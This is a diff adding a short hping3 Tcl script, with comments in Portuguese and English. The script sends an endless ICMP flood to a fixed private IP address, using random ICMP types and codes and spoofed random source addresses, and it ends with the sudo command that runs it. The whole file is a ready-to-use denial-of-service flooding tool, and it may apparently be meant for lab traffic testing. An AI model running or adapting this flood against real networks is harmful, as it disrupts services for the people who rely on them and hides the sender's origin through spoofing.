@@ -1,0 +1,21 @@
+# hping3_icmp_random_type_code.htcl
+# ICMP flood with random type and code (0–15) and spoofed source IP using hping3 scripting mode
+
+set dst_ip "192.168.100.2"
+
+# Gera um IP aleatório no formato x.x.x.x
+proc random_ip {} {
+    return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
+}
+
+# Flood infinito (Ctrl+C para parar)
+while {1} {
+    set type [expr {int(rand()*16)}]   ;# ICMP type entre 0 e 15
+    set code [expr {int(rand()*16)}]   ;# ICMP code entre 0 e 15
+    set saddr [random_ip]              ;# Spoof IP aleatório
+
+    set pkt "ip(saddr=$saddr,daddr=$dst_ip)+icmp(type=$type,code=$code)"
+    hping send $pkt
+}
+
+# sudo hping3 exec icmp_random_type_code.htcl
